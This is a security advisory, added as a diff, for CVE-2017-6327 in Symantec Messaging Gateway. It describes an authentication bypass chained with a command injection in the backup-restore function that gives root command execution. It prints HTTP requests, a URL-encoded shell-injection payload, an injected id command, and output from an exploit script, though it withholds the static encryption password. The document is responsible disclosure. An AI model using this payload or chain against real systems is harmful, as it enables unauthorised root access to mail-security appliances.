@@ -1,0 +1,183 @@
+This is an advisory for CVE-2017-6327 which is an unauthenticated remote
+code execution flaw in the web interface of Symantec Messaging Gateway
+prior to and including version 10.6.3-2, which can be used to execute
+commands as root.
+
+Symantec Messaging Gateway, formerly known as Brightmail, is a linux-based
+anti-spam/security product for e-mail servers. It is deployed as a physical
+device or with ESX in close proximity to the servers it is designed to
+protect.
+
+=*=*=*=*=*=*=*=*=    TIMELINE
+
+2017-07-07: Reported to Symantec
+2017-08-10: Patch and notice released by Symantec [1]
+2017-08-18: Public technical advisory
+
+=*=*=*=*=*=*=*=*=    DESCRIPTION
+
+- Bug #1: Web authentication bypass
+
+The web management interface is available via HTTPS, and you can't do much
+without logging in.
+
+If the current session (identified by the `JSESSIONID` cookie) has the
+`user` attribute set, the session is considered authenticated.
+
+The file LoginAction.class defines a number of public methods and they can
+all be reached via unauthenticated web requests.
+
+By making a GET request to `/brightmail/action1.do?method=method_name` we
+can execute `LoginAction.method_name` if `method_name` is a public method.
+
+One such public method which will be the target of our authentication
+bypass is called `LoginAction.notificationLogin`.
+
+It does the following:
+
+1. Decrypt the `notify` parameter using `BrightmailDecrypt.decrypt`
+2. Creates a new `UserTO` object using the decrypted `notify` parameter as
+an email value
+3. Creates a new session, invalidating the old one if necessary
+4. Sets the `user` attribute of the newly created session to our
+constructed UserTO object
+
+It essentially takes a username value from a GET parameter and logs you in
+as this user if it exists. If not, it creates this user for you.
+
+We need to encrypt our `notify` argument so that
+`BrightmailDecrypt.decrypt` will decrypt it properly. Fortunately the
+encryption is just PBEWithMD5AndDES using a static password, conveniently
+included in the code itself. I won't include the encryption password or a
+fully encrypted notify string in this post.
+
+
+Example request:
+
+GET
+/brightmail/action1.do?method=notificationLogin&notify=MTIzNDU2Nzg%3d6[...]&id=test
+HTTP/1.1
+...
+
+
+HTTP/1.1 302 Found
+Server: Apache-Coyote/1.1
+...
+Set-Cookie: JSESSIONID=9E45E9F70FAC0AADAC9EB7A03532F65D; Path=/brightmail;
+Secure; HttpOnly
+
+
+- Bug #2: Command injection
+
+The RestoreAction.performRestore method can be reached with an
+authenticated session and it takes the restoreSource and
+localBackupFilename parameters.
+
+After a long chain of function calls, localBackupFilename ends up being
+sent to the local "bmagent" daemon listening on port 41002. It will execute
+/opt/Symantec/Brightmail/cli/bin/db-restore with argv[1] being our supplied
+value.
+
+The db-restore script is a sudo wrapper for
+/opt/Symantec/Brightmail/cli/sbin/db-restore, which in turn is a perl
+script containing a command injection in a call to /usr/bin/du.
+
+$ /opt/Symantec/Brightmail/cli/bin/db-restore 'asdf;"`id`";'
+/usr/bin/du: cannot access `/data/backups/asdf': No such file or directory
+sh: uid=0(root) gid=0(root) groups=0(root): command not found
+ERROR: Failed to copy 'asdf;"`id`";' from local backup store: No such file
+or directory
+
+
+This command injection can be exploited from the web management interface
+with a valid session, which we can create using bug #1.
+
+- Combining bug #1 and #2
+
+The last step is to get a CSRF token since the vulnerable performRestore
+function is annotated with @CSRF.
+
+After some quick digging it turns out that all you need to do is call
+/brightmail/common.jsp to get a token that will be valid for all your
+requests.
+
+The URL-encoded value we provide for the `localBackupFileSelection`
+parameter is:
+asdf`id>/data/bcc/webapps/brightmail/output.txt;/bin/uname
+-a>>/data/bcc/webapps/brightmail/output.txt`hehehe
+
+Request:
+
+GET
+/brightmail/admin/restore/action5.do?method=performRestore&symantec.brightmail.key.TOKEN=bbda9b0a52bca4a43cc2b6051cd6b95900068cd3&restoreSource=APPLIANCE&localBackupFileSelection=%61%73%64%66%60%69%64%3e%2f%64%61%74%61%2f%62%63%63%2f%77%65%62%61%70%70%73%2f%62%72%69%67%68%74%6d%61%69%6c%2f%6f%75%74%70%75%74%2e%74%78%74%3b%2f%62%69%6e%2f%75%6e%61%6d%65%20%2d%61%3e%3e%2f%64%61%74%61%2f%62%63%63%2f%77%65%62%61%70%70%73%2f%62%72%69%67%68%74%6d%61%69%6c%2f%6f%75%74%70%75%74%2e%74%78%74%60%68%65%68%65%68%65
+HTTP/1.1
+Host: 192.168.205.220
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0)
+Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Cookie: JSESSIONID=34D61B34698831DB765A9DD5E0049D0B
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+Response:
+
+HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Cache-Control: no-store,no-cache
+Pragma: no-cache
+Expires: Thu, 01 Jan 1970 00:00:00 GMT
+X-Frame-Options: SAMEORIGIN
+Content-Type: text/html;charset=UTF-8
+Content-Length: 803
+Date: Thu, 29 Jun 2017 06:48:12 GMT
+Connection: close
+
+<HTML>
+<title>Symantec Messaging Gateway -&nbsp;Restore</title>
+...
+
+
+Now to confirm that our command output was correctly placed in a file
+inside the webroot.
+
+imac:~% curl -k https://192.168.205.220/brightmail/output.txt
+uid=0(root) gid=0(root) groups=0(root)
+Linux localhost.localdomain 2.6.32-573.3.1.el6.x86_64 #1 SMP Thu Aug 13
+22:55:16 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+
+
+=*=*=*=*=*=*=*=*=    EXPLOIT OUTPUT
+
+imac:~/brightmail% python brightmail-rce.py
+https://192.168.205.220/brightmail
+bypassing login..
+* JSESSIONID=693079639299816F80016123BE8A0167
+verifying login bypass..
+* Version: 10.6.3
+getting csrf token..
+* 1e35af8c567d3448a65c8516a835cec30b6b8b73
+done, verifying..
+
+uid=501(bcc) gid=99(nobody) euid=0(root) egid=0(root)
+groups=0(root),99(nobody),499(mysql),502(bcc)
+Linux localhost.localdomain 2.6.32-573.3.1.el6.x86_64 #1 SMP Thu Aug 13
+22:55:16 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+
+
+# cat /etc/issue
+
+Symantec Messaging Gateway
+Version 10.6.3-2
+Copyright (c) 1998-2017 Symantec Corporation.  All rights reserved.
+
+
+=*=*=*=*=*=*=*=*=    REFERENCES
+
+[1]
+https://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=&suid=20170810_00
+
+=*=*=*=*=*=*=*=*=    CREDIT
+
+Philip Pettersson
